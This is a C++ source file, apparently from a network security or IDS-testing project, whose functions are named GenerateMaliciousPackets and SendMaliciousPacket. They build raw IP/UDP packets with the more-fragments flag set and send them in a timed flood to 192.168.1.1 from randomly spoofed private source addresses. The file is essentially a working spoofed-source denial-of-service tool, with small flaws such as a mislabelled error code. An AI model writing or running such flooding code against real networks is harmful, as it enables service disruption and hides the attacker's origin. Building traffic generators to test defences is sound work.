#include <arpa/inet.h>
#include <chrono>
#include <cstdlib>
#include <cstring>
#include <thread>
#include <iostream>
#include <mutex>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <unistd.h>
#include "packet_generator.h"
#include "user_program.h"

extern std::mutex print_mutex;

// 데이터의 정확성을 검증하기 위해 사용하는 체크섬을 계산하는 함수
unsigned short CheckSum(void *b, int nLen) {
    unsigned short *buf = (unsigned short*)b;
    unsigned int nSum = 0;
    unsigned short nResult;

    for (nSum = 0; nLen > 1; nLen -= 2) {
        nSum += *buf++;
    }
    if (nLen == 1) nSum += *(unsigned char*)buf;
    nSum = (nSum >> HALF_WORD_SIZE) + (nSum & HALF_WORD_MASK);
    nSum += (nSum >> HALF_WORD_SIZE);
    nResult = ~nSum;
    return nResult;
}

// 네트워크를 통해 패킷을 생성하는 함수
int CPacketGenerator::GenerateMaliciousPackets(std::atomic<int>& totalMaliciousPacketsSent) {
    try {
        srand(static_cast<unsigned int>(time(0)));
        std::ofstream logFile("logs/packet_transmission.log", std::ios_base::app);
        if (!logFile.is_open()) return ERROR_CANNOT_OPEN_FILE;

        logFile << "Sending packets..." << std::endl;
        {
            std::lock_guard<std::mutex> lock(print_mutex);
            std::cout << COLOR_GREEN "Packets being sent over the network for 10 seconds...\n" << COLOR_RESET << std::endl;
        }

        auto startTime = std::chrono::steady_clock::now();
        while (std::chrono::duration_cast<std::chrono::seconds>(std::chrono::steady_clock::now() - startTime).count() < TRANSMISSION_DURATION) {
            for (int i = 0; i < PACKETS_PER_INTERVAL; i++) {
                std::string src_ip = "192.168." + std::to_string(rand() % MAX_SEGMENT_VALUE) + "." + std::to_string(rand() % MAX_SEGMENT_VALUE);
                int result = SendMaliciousPacket(src_ip.c_str(), "192.168.1.1", 1, logFile);
                if (result != SUCCESS_CODE) {
                    logFile << GetErrorMessage(result) << std::endl;
                    return result;
                }
                totalMaliciousPacketsSent++;
                {
                    std::lock_guard<std::mutex> lock(print_mutex);
                    std::cout << "\rTotal number of packets sent: " << totalMaliciousPacketsSent.load() << std::flush;
                }
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(TRANSMISSION_INTERVAL));
        }

        logFile.close();
    } catch (const std::exception& e) {
        return ERROR_UNKNOWN;
    }
    return SUCCESS_CODE;
}

// 소스 IP 주소에서 목적지 IP 주소로 지정된 횟수만큼 패킷을 전송하는 함수
int CPacketGenerator::SendMaliciousPacket(const char* src_ip, const char* dst_ip, int packet_count, std::ofstream& logFile) {
    int nSock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (nSock < 0) {
        perror("Socket creation failed");
        return ERROR_CANNOT_OPEN_DEVICE;
    }

    char packet[PACKET_BUFFER_SIZE];
    memset(packet, 0, PACKET_BUFFER_SIZE);

    struct iphdr *iph = (struct iphdr *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
    struct sockaddr_in sin;

    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(dst_ip);

    iph->ihl = IP_HEADER_LENGTH;
    iph->version = IP_VERSION;
    iph->tos = IP_TYPE_OF_SERVICE;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + MAX_PACKET_SIZE);
    iph->id = htonl(rand() % MAX_PACKET_ID);
    iph->frag_off = htons(IP_MORE_FRAGMENTS);
    iph->ttl = IP_TTL;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr(src_ip);
    iph->daddr = sin.sin_addr.s_addr;

    udph->source = htons(SOURCE_PORT);
    udph->dest = htons(DESTINATION_PORT);
    udph->len = htons(sizeof(struct udphdr) + MAX_PACKET_SIZE);
    udph->check = 0;

    memset(packet + sizeof(struct iphdr) + sizeof(struct udphdr), 'A', MAX_PACKET_SIZE);
    iph->check = CheckSum((unsigned short *)packet, sizeof(struct iphdr) + sizeof(struct udphdr) + MAX_PACKET_SIZE);

    for (int I = 0; I < packet_count; I++) {
        if (sendto(nSock, packet, sizeof(struct iphdr) + sizeof(struct udphdr) + MAX_PACKET_SIZE, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            perror("Packet send failed");
            close(nSock);
            return ERROR_CANNOT_SEND_EMAIL;
        } else {
            logFile << "Packet sent from " << src_ip << " to " << dst_ip << std::endl;
        }
    }

    close(nSock);
    return SUCCESS_CODE;
}